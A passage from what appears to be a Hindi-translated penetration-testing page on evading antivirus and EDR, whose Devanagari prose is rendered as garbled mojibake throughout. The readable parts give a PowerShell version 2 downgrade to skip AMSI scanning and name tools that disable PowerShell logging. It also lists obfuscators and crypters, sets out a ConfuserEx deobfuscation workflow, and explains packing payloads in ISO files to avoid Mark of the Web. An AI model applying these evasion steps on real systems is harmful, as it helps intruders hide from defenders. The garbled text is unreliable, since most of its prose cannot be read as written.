рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЗрд╕реЗ рдореЗрдореЛрд░реА рд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИред

**AMSI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ AV/EDR рдЙрддреНрдкрд╛рдж**

рдЖрдк **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** рдореЗрдВ AMSI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ AV/EDR рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рд╕реВрдЪреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

**Powershell рд╕рдВрд╕реНрдХрд░рдг 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**
рдпрджрд┐ рдЖрдк PowerShell рд╕рдВрд╕реНрдХрд░рдг 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдмрд┐рдирд╛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдРрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell рд▓реЙрдЧрд┐рдВрдЧ рдПрдХ рдлреАрдЪрд░ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕рднреА PowerShell рдХрдорд╛рдВрдб рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдСрдбрд┐рдЯрд┐рдВрдЧ рдФрд░ рд╕рдорд╕реНрдпрд╛ рдирд┐рд╡рд╛рд░рдг рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬреЛ рдкрд╣рдЪрд╛рди рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**ред

PowerShell рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- **PowerShell рдЯреНрд░рд╛рдВрд╕рдХреНрд░рд┐рдкреНрд╢рди рдФрд░ рдореЙрдбреНрдпреВрд▓ рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ**: рдЖрдк рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) рдЬреИрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- **Powershell рд╕рдВрд╕реНрдХрд░рдг 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**: рдпрджрд┐ рдЖрдк PowerShell рд╕рдВрд╕реНрдХрд░рдг 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AMSI рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЕрдкрдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдмрд┐рдирд╛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдРрд╕рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `powershell.exe -version 2`
- **рдПрдХ unmanaged PowerShell рд╕рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдмрд┐рдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ PowerShell рдХреЛ рд╕реНрдкреЙрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдпрд╣ рд╡рд╣реА рд╣реИ рдЬреЛ Cobalt Strike рд╕реЗ `powerpick` рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ)ред

## Obfuscation

> [!TIP]
> рдХрдИ рдСрдмрдлрд╕реНрдХреЗрд╢рди рддрдХрдиреАрдХреЗрдВ рдбреЗрдЯрд╛ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИрдВ, рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреА рдПрдВрдЯреНрд░реЙрдкреА рдХреЛ рдмрдврд╝рд╛ рджреЗрдЧреА рдЬрд┐рд╕рд╕реЗ AVs рдФрд░ EDRs рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдкрд╣рдЪрд╛рдирдирд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд╕рд╛рде рд╕рд╛рд╡рдзрд╛рди рд░рд╣реЗрдВ рдФрд░ рд╢рд╛рдпрдж рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдХреЛрдб рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЕрдиреБрднрд╛рдЧреЛрдВ рдкрд░ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ рдпрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рдЫрд┐рдкрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

### Deobfuscating ConfuserEx-Protected .NET Binaries

рдЬрдм ConfuserEx 2 (рдпрд╛ рд╡реНрдпрд╛рд╡рд╕рд╛рдпрд┐рдХ рдлреЛрд░реНрдХ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдореИрд▓рд╡реЗрдпрд░ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рддреЛрдВ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдЬреЛ рдбрд┐рдХрдВрдкрд╛рдЗрд▓рд░реНрд╕ рдФрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░ рджреЗрдВрдЧреАред рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд░реВрдк рд╕реЗ **рдПрдХ рд▓рдЧрднрдЧ-рдореВрд▓ IL рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ** рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ dnSpy рдпрд╛ ILSpy рдЬреИрд╕реЗ рдЯреВрд▓ рдореЗрдВ C# рдореЗрдВ рдбрд┐рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

1.  рдПрдВрдЯреА-рдЯреИрдореНрдкрд░ рд╣рдЯрд╛рдирд╛ тАУ ConfuserEx рд╣рд░ *рдореЗрдердб рдмреЙрдбреА* рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ *рдореЙрдбреНрдпреВрд▓* рд╕реНрдереИрддрд┐рдХ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ (`<Module>.cctor`) рдХреЗ рдЕрдВрджрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ PE рдЪреЗрдХрд╕рдо рдХреЛ рднреА рдкреИрдЪ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХреЛрдИ рднреА рд╕рдВрд╢реЛрдзрди рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд░реИрд╢ рдХрд░ рджреЗред **AntiTamperKiller** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдореЗрдЯрд╛рдбреЗрдЯрд╛ рддрд╛рд▓рд┐рдХрд╛рдУрдВ рдХреЛ рдвреВрдВрдврд╛ рдЬрд╛ рд╕рдХреЗ, XOR рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдПрдХ рд╕рд╛рдл рдЕрд╕реЗрдВрдмрд▓реА рдХреЛ рдлрд┐рд░ рд╕реЗ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХреЗ:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ 6 рдПрдВрдЯреА-рдЯреИрдореНрдкрд░ рдкреИрд░рд╛рдореАрдЯрд░ (`key0-key3`, `nameHash`, `internKey`) рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЗ рдЕрдкрдиреЗ рдЕрдирдкреИрдХрд░ рдмрдирд╛рдиреЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

2.  рдкреНрд░рддреАрдХ / рдирд┐рдпрдВрддреНрд░рдг-рдкреНрд░рд╡рд╛рд╣ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ тАУ *рд╕рд╛рдл* рдлрд╝рд╛рдЗрд▓ рдХреЛ **de4dot-cex** (de4dot рдХрд╛ рдПрдХ ConfuserEx-рдЬрд╛рдирдХрд╛рд░реА рд╡рд╛рд▓рд╛ рдлреЛрд░реНрдХ) рдореЗрдВ рдлреАрдб рдХрд░реЗрдВред
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
рдлреНрд▓реИрдЧ:
тАв `-p crx` тАУ ConfuserEx 2 рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ
тАв de4dot рдирд┐рдпрдВрддреНрд░рдг-рдкреНрд░рд╡рд╛рд╣ рд╕рдорддрд▓реАрдХрд░рдг рдХреЛ рдкреВрд░реНрд╡рд╡рдд рдХрд░реЗрдЧрд╛, рдореВрд▓ рдирд╛рдорд╕реНрдерд╛рди, рд╡рд░реНрдЧ рдФрд░ рдЪрд░ рдирд╛рдореЛрдВ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рд╕реНрдерд╛рдпреА рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдЧрд╛ред

3.  рдкреНрд░реЙрдХреНрд╕реА-рдХреЙрд▓ рд╕реНрдЯреНрд░рд┐рдкрд┐рдВрдЧ тАУ ConfuserEx рдкреНрд░рддреНрдпрдХреНрд╖ рдореЗрдердб рдХреЙрд▓ рдХреЛ рд╣рд▓реНрдХреЗ рд░реИрдкрд░ (рдЬрд┐рд╕реЗ *рдкреНрд░реЙрдХреНрд╕реА рдХреЙрд▓* рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдХреЗ рд╕рд╛рде рдмрджрд▓рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдбрд┐рдХрдВрдкрд╛рдЗрд▓рд┐рдВрдЧ рдХреЛ рдФрд░ рддреЛрдбрд╝ рд╕рдХреЗред рдЙрдиреНрд╣реЗрдВ **ProxyCall-Remover** рдХреЗ рд╕рд╛рде рд╣рдЯрд╛ рджреЗрдВ:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
рдЗрд╕ рдЪрд░рдг рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ рд╕рд╛рдорд╛рдиреНрдп .NET API рдЬреИрд╕реЗ `Convert.FromBase64String` рдпрд╛ `AES.Create()` рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдмрдЬрд╛рдп рдЕрдкрд╛рд░рджрд░реНрд╢реА рд░реИрдкрд░ рдлрд╝рдВрдХреНрд╢рдВрд╕ (`Class8.smethod_10`, тАж) рдХреЗред

4.  рдореИрдиреБрдЕрд▓ рд╕рдлрд╛рдИ тАУ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдмрд╛рдЗрдирд░реА рдХреЛ dnSpy рдХреЗ рддрд╣рдд рдЪрд▓рд╛рдПрдВ, рдмрдбрд╝реЗ Base64 рдмреНрд▓реЙрдмреНрд╕ рдпрд╛ `RijndaelManaged`/`TripleDESCryptoServiceProvider` рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ *рд╡рд╛рд╕реНрддрд╡рд┐рдХ* рдкреЗрд▓реЛрдб рдХреЛ рдвреВрдВрдврд╛ рдЬрд╛ рд╕рдХреЗред рдЕрдХреНрд╕рд░ рдореИрд▓рд╡реЗрдпрд░ рдЗрд╕реЗ `<Module>.byte_0` рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ TLV-рдХреЛрдбрд┐рдд рдмрд╛рдЗрдЯ рдПрд░реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИред

рдЙрдкрд░реЛрдХреНрдд рд╢реНрд░реГрдВрдЦрд▓рд╛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдирдореВрдиреЗ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреА рд╣реИ - рдСрдлрд╝рд▓рд╛рдЗрди рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдкрд░ рдХрд╛рдо рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧреАред

> ЁЯЫИ  ConfuserEx рдПрдХ рдХрд╕реНрдЯрдо рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо `ConfusedByAttribute` рд╣реИ рдЬрд┐рд╕реЗ IOC рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирдореВрдиреЛрдВ рдХреА рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреА рдЬрд╛ рд╕рдХреЗред

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп [LLVM](http://www.llvm.org/) рд╕рдВрдХрд▓рди рд╕реВрдЯ рдХрд╛ рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдлреЛрд░реНрдХ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ рдЬреЛ [рдХреЛрдб рдСрдмрдлрд╕реНрдХреЗрд╢рди](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) рдФрд░ рдЯреЗрдореНрдкрд░-рдкреНрд░реВрдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛ рд╕рдХреЗред
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ `C++11/14` рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╕рдВрдХрд▓рди рдХреЗ рд╕рдордп, рдмрд┐рдирд╛ рдХрд┐рд╕реА рдмрд╛рд╣рд░реА рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдФрд░ рд╕рдВрдХрд▓рдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛, рдСрдмрдлрд╕реНрдХреЗрдЯреЗрдб рдХреЛрдб рдХреИрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- [**obfy**](https://github.com/fritzone/obfy): C++ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдЯрд╛рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдСрдмрдлрд╕реНрдХреЗрдЯреЗрдб рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд▓рд┐рдП рдЬреАрд╡рди рдХреЛ рдереЛрдбрд╝рд╛ рдХрдард┐рди рдмрдирд╛ рджреЗрдЧреАред
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz рдПрдХ x64 рдмрд╛рдЗрдирд░реА рдСрдмрдлрд╕реНрдХреЗрдЯрд░ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА pe рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдСрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ, рдЬрд┐рд╕рдореЗрдВ: .exe, .dll, .sys рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
- [**metame**](https://github.com/a0rtega/metame): Metame рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдореЗрдЯрд╛рдореЙрд░реНрдлрд┐рдХ рдХреЛрдб рдЗрдВрдЬрди рд╣реИ рдЬреЛ рдордирдорд╛рдиреЗ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЗ рд▓рд┐рдП рд╣реИред
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator рдПрдХ рдмрд╛рд░реАрдХ-рдмрд╛рд░реАрдХ рдХреЛрдб рдСрдмрдлрд╕реНрдХреЗрд╢рди рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ LLVM-рд╕рдорд░реНрдерд┐рдд рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП ROP (рд░рд┐рдЯрд░реНрди-рдУрд░рд┐рдПрдВрдЯреЗрдб рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред ROPfuscator рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рд╕реНрддрд░ рдкрд░ рдСрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдп рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреА рд╣рдорд╛рд░реА рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рдзрд╛рд░рдгрд╛ рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИред
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt рдПрдХ .NET PE рдХреНрд░рд┐рдкреНрдЯрд░ рд╣реИ рдЬреЛ Nim рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИред
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor рдореМрдЬреВрджрд╛ EXE/DLL рдХреЛ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИред

## SmartScreen & MoTW

рдЖрдкрдиреЗ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдпрд╣ рд╕реНрдХреНрд░реАрди рджреЗрдЦреА рд╣реЛрдЧреАред

Microsoft Defender SmartScreen рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдмрдЪрд╛рдирд╛ рд╣реИред

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ рдкреНрд░рддрд┐рд╖реНрдард╛-рдЖрдзрд╛рд░рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЕрд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдЕрдиреБрдкреНрд░рдпреЛрдЧ SmartScreen рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдЧреА, рдЬрд┐рд╕рд╕реЗ рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рдПрдЧрд╛ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрднреА рднреА More Info -> Run anyway рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

**MoTW** (Mark of The Web) рдПрдХ [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо Zone.Identifier рд╣реИ, рдЬреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдЙрд╕ URL рдХреЗ рд╕рд╛рде рдЬрд┐рд╕рд╕реЗ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

<figure><img src="../images/image (237).png" alt=""><figcaption><p>рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП Zone.Identifier ADS рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ред</p></figcaption></figure>

> [!TIP]
> рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** рд╕рд╛рдЗрдирд┐рдВрдЧ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХреА рдЧрдИ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ **SmartScreen рдХреЛ рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рдХрд░реЗрдВрдЧреА**ред

рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЛ Mark of The Web рд╕реЗ рдмрдЪрд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдВрдЯреЗрдирд░ рдЬреИрд╕реЗ ISO рдХреЗ рдЕрдВрджрд░ рдкреИрдХреЗрдЬ рдХрд░рдирд╛ рд╣реИред рдРрд╕рд╛ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Mark-of-the-Web (MOTW) **рдЧреИрд░ NTFS** рд╡реЙрд▓реНрдпреВрдо рдкрд░ **рд▓рд╛рдЧреВ рдирд╣реАрдВ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

